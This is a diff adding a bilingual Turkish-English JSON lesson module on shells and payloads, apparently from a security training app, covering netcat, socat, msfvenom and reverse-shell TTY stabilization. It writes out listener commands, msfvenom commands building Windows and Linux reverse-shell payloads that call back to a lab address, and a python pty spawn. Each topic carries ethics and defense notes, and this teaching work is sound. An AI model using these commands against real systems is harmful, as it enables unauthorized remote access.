@@ -1,0 +1,49 @@
+{
+  "id": "shells",
+  "title": { "tr": "Kabuklar ve Payloadlar", "en": "Shells & Payloads" },
+  "subtitle": { "tr": "Netcat, Socat, msfvenom, shell stabilizasyonu", "en": "Netcat, Socat, msfvenom, shell stabilization" },
+  "icon": "terminal",
+  "level": "offensive",
+  "topics": [
+    {
+      "id": "netcat",
+      "title": { "tr": "Netcat (nc)", "en": "Netcat (nc)" },
+      "tags": ["shells"],
+      "ethics": true,
+      "content": {
+        "tr": "## Netcat — Ağın İsviçre Çakısı\nBasit TCP/UDP bağlantıları, dosya transferi ve dinleyiciler için.\n\n### Komutlar\n```\nnc -lvnp 4444             # dinleyici (listen)\nnc -zv 10.10.10.5 22      # port bağlantı testi\nnc -lvnp 4444 > gelen.bin # dosya al\nnc 10.10.10.5 4444 < dosya.bin   # dosya gönder\n```\n- Bayraklar: `-l` dinle · `-v` ayrıntılı · `-n` DNS yok · `-p` port · `-z` veri gönderme (tarama).\n\n### Mini-lab\nİki lab makinesi arasında nc ile bir metin dosyası aktar; sonra bir dinleyici kurup karşıdan bağlanmayı dene.\n\n> Etik & savunma: Yalnızca izinli lab. Savunma: beklenmedik dinleyen portlar ve giden bağlantılar EDR/firewall ile izlenir.\n\n> Yaygın hata: Üretim sistemlerinde 'hızlı test' için nc dinleyici bırakmak ve kapatmayı unutmak. Açık dinleyici bir arka kapıya dönüşebilir.",
+        "en": "## Netcat — The Swiss Army Knife of Networking\nFor simple TCP/UDP connections, file transfer and listeners.\n\n### Commands\n```\nnc -lvnp 4444             # listener\nnc -zv 10.10.10.5 22      # port connection test\nnc -lvnp 4444 > incoming.bin # receive a file\nnc 10.10.10.5 4444 < file.bin    # send a file\n```\n- Flags: `-l` listen · `-v` verbose · `-n` no DNS · `-p` port · `-z` no data (scan).\n\n### Mini-lab\nTransfer a text file between two lab machines with nc; then set up a listener and connect from the other side.\n\n> Ethics & defense: Authorized lab only. Defense: monitor unexpected listening ports and outbound connections with EDR/firewall.\n\n> Common mistake: Leaving an nc listener on production for a 'quick test' and forgetting to close it. An open listener can become a backdoor."
+      }
+    },
+    {
+      "id": "socat",
+      "title": { "tr": "Socat (İleri Bağlantılar)", "en": "Socat (Advanced Connections)" },
+      "tags": ["shells"],
+      "ethics": true,
+      "content": {
+        "tr": "## Socat\nNetcat'in güçlü akrabası: şifreli tüneller, tam etkileşimli kabuklar (TTY) ve port yönlendirme.\n\n### Komutlar (yalnızca lab)\n```\n# Şifreli dinleyici\nsocat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 -\n# Port yönlendirme (relay)\nsocat TCP-LISTEN:8080,fork TCP:10.10.10.5:80\n```\n\n### Neden önemli?\nTLS ile kabuğu şifrelemek **ağ tabanlı** tespiti zorlaştırır → savunmanın neden uç nokta (EDR) ve TLS-içi denetime ihtiyaç duyduğunu gösterir.\n\n### Mini-lab\nİki lab VM'i arasında socat ile bir TCP relay kur; trafiğin nasıl yönlendiğini Wireshark'la izle.\n\n> Etik: Yalnızca izinli lab. Bu teknik savunma ekiplerine şifreli C2 trafiğini anlamaları için öğretilir.\n\n> Yaygın hata: Şifreli kanalın 'görünmez' olduğunu sanmak. Ağda içerik gizlense de **bağlantı meta verisi** (kim, kime, ne zaman, hacim) ve uç nokta davranışı hâlâ tespit edilebilir.",
+        "en": "## Socat\nNetcat's powerful cousin: encrypted tunnels, fully interactive shells (TTY) and port forwarding.\n\n### Commands (lab only)\n```\n# Encrypted listener\nsocat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 -\n# Port forwarding (relay)\nsocat TCP-LISTEN:8080,fork TCP:10.10.10.5:80\n```\n\n### Why it matters\nEncrypting a shell with TLS makes **network-based** detection harder → it shows why defenders need endpoint (EDR) and in-TLS inspection.\n\n### Mini-lab\nSet up a TCP relay between two lab VMs with socat; watch the redirected traffic in Wireshark.\n\n> Ethics: Authorized lab only. This is taught so defenders understand encrypted C2 traffic.\n\n> Common mistake: Believing an encrypted channel is 'invisible'. Even with hidden content, **connection metadata** (who, to whom, when, volume) and endpoint behavior remain detectable."
+      }
+    },
+    {
+      "id": "msfvenom",
+      "title": { "tr": "msfvenom (Payload Üretme)", "en": "msfvenom (Payload Generation)" },
+      "tags": ["shells", "exploit"],
+      "ethics": true,
+      "content": {
+        "tr": "## msfvenom\nMetasploit'in payload üreticisi; farklı platform ve formatlarda payload oluşturur.\n\n### Komut\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.3 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=10.10.14.3 LPORT=4444 -f elf -o sh.elf\n```\n- `-p` payload · `-f` format (exe/elf/raw/python) · `LHOST/LPORT` geri dönüş adresi.\n\n### Mini-lab (yalnızca kendi lab makinende)\nBir test payload üret, kendi lab Windows VM'inde çalıştır ve Metasploit handler ile oturumu yakala.\n\n> Etik & savunma: Üretilen payload yalnızca kendi lab makinende test edilir. Modern EDR davranışsal analizle bu payloadları yakalar; imza atlatma kalıcı bir çözüm değildir.\n\n> Yaygın hata: Encoder kullanmanın AV'yi 'aşacağını' sanmak. Encoderlar imza değiştirir ama davranışı değiştirmez; davranışsal EDR yine de yakalar.",
+        "en": "## msfvenom\nMetasploit's payload generator; builds payloads in various platforms and formats.\n\n### Command\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.3 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=10.10.14.3 LPORT=4444 -f elf -o sh.elf\n```\n- `-p` payload · `-f` format (exe/elf/raw/python) · `LHOST/LPORT` callback address.\n\n### Mini-lab (your own lab machine only)\nGenerate a test payload, run it on your own lab Windows VM and catch the session with a Metasploit handler.\n\n> Ethics & defense: Generated payloads are tested only on your own lab machine. Modern EDR catches these via behavioral analysis; signature evasion isn't a durable bypass.\n\n> Common mistake: Thinking encoders 'beat' AV. Encoders change the signature but not the behavior; behavioral EDR still catches them."
+      }
+    },
+    {
+      "id": "shell-upgrade",
+      "title": { "tr": "Shell Stabilizasyonu (TTY Upgrade)", "en": "Shell Stabilization (TTY Upgrade)" },
+      "tags": ["shells"],
+      "ethics": true,
+      "content": {
+        "tr": "## Kabuk Stabilizasyonu\nİlk elde edilen reverse shell genelde **kısıtlıdır** (TTY yok): Ctrl+C oturumu öldürür, `sudo`/interaktif komutlar çalışmaz, ok tuşları bozuktur. Stabilizasyon bunu tam bir terminale yükseltir.\n\n### Yaygın yöntem (Linux, yalnızca lab)\n```\n# 1) PTY oluştur\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# 2) yerel terminali ham moda al (kendi makinende)\n# Ctrl+Z; stty raw -echo; fg; enter\nexport TERM=xterm\n```\n\n### Mini-lab\nLab'da bir reverse shell al, yukarıdaki adımlarla tam TTY'ye yükselt; Ctrl+C'nin artık oturumu öldürmediğini doğrula.\n\n> Bağlam: Bu, saldırı zincirinde küçük ama pratik bir beceridir; OSCP gibi sınavlarda sık gerekir. Yalnızca izinli lab hedeflerinde.\n\n> Yaygın hata: Stabilize edilmemiş kabukta `sudo` veya interaktif bir editör çalıştırıp oturumu kilitlemek/kaybetmek. Önce TTY'yi yükselt.",
+        "en": "## Shell Stabilization\nThe initial reverse shell is usually **limited** (no TTY): Ctrl+C kills the session, `sudo`/interactive commands fail, arrow keys are broken. Stabilization upgrades it to a full terminal.\n\n### Common method (Linux, lab only)\n```\n# 1) Spawn a PTY\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# 2) put your local terminal in raw mode (on your machine)\n# Ctrl+Z; stty raw -echo; fg; enter\nexport TERM=xterm\n```\n\n### Mini-lab\nGet a reverse shell in a lab, upgrade it to a full TTY with the steps above; verify Ctrl+C no longer kills the session.\n\n> Context: A small but practical skill in the attack chain; often needed in exams like OSCP. Only on authorized lab targets.\n\n> Common mistake: Running `sudo` or an interactive editor in an unstabilized shell and locking up/losing the session. Upgrade the TTY first."
+      }
+    }
+  ]
+}
